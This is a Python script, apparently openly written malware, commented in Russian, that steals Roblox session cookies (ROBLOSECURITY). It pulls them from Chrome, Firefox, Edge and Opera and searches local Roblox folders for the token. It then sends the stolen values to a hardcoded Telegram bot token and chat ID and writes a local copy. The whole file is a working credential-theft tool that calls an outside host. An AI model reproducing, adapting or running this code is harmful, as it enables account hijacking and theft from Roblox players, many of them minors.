import os
import requests
import json
import base64
import browser_cookie3
from cryptography.fernet import Fernet

# Конфигурация
TOKEN = "7682298160:AAHfpVCsJrvhK_O8RaYGgA3TED1QAmyiLCw"
CHAT_ID = "7635966234"

def encrypt_data(data):
    """Шифрование данных"""
    key = base64.b64encode(b'roblox-stealer-encryption-key-12345')
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

def send_telegram(message):
    """Отправка в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def steal_roblox_cookies():
    """Кража ROBLOSECURITY cookie из всех источников"""
    stolen_data = {}
    
    # Кража из браузеров
    browsers = [
        ("Chrome", browser_cookie3.chrome),
        ("Firefox", browser_cookie3.firefox),
        ("Edge", browser_cookie3.edge),
        ("Opera", browser_cookie3.opera)
    ]
    
    for browser_name, browser_func in browsers:
        try:
            cookies = browser_func(domain_name='roblox.com')
            roblox_cookies = []
            
            for cookie in cookies:
                if 'ROBLOSECURITY' in cookie.name or 'roblox' in cookie.domain:
                    roblox_cookies.append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path
                    })
            
            if roblox_cookies:
                stolen_data[browser_name] = roblox_cookies
        except:
            continue
    
    # Поиск в файлах Roblox
    roblox_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Roblox"),
        os.path.expandvars(r"%USERPROFILE%\AppData\Local\Roblox"),
        os.path.expandvars(r"%TEMP%\Roblox")
    ]
    
    for path in roblox_paths:
        if os.path.exists(path):
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.txt', '.log', '.dat')):
                            try:
                                with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    if 'ROBLOSECURITY' in content:
                                        stolen_data[f'File_{file}'] = content
                            except:
                                pass
            except:
                pass
    
    return stolen_data

def main():
    # Мгновенная кража и отправка
    stolen_cookies = steal_roblox_cookies()
    
    if stolen_cookies:
        # Формируем отчет
        report = "🎯 ROBLOX COOKIES STOLEN\n\n"
        
        for source, cookies in stolen_cookies.items():
            report += f"=== {source} ===\n"
            for cookie in cookies:
                report += f"🔑 {cookie['name']}: {cookie['value'][:50]}...\n"
            report += "\n"
        
        # Отправляем в Telegram
        send_telegram(report)
        
        # Дополнительно сохраняем в файл на всякий случай
        try:
            with open('roblox_cookies.txt', 'w') as f:
                json.dump(stolen_cookies, f, indent=2)
        except:
            pass
    else:
        send_telegram("❌ ROBLOX cookies not found")

if __name__ == "__main__":
    main()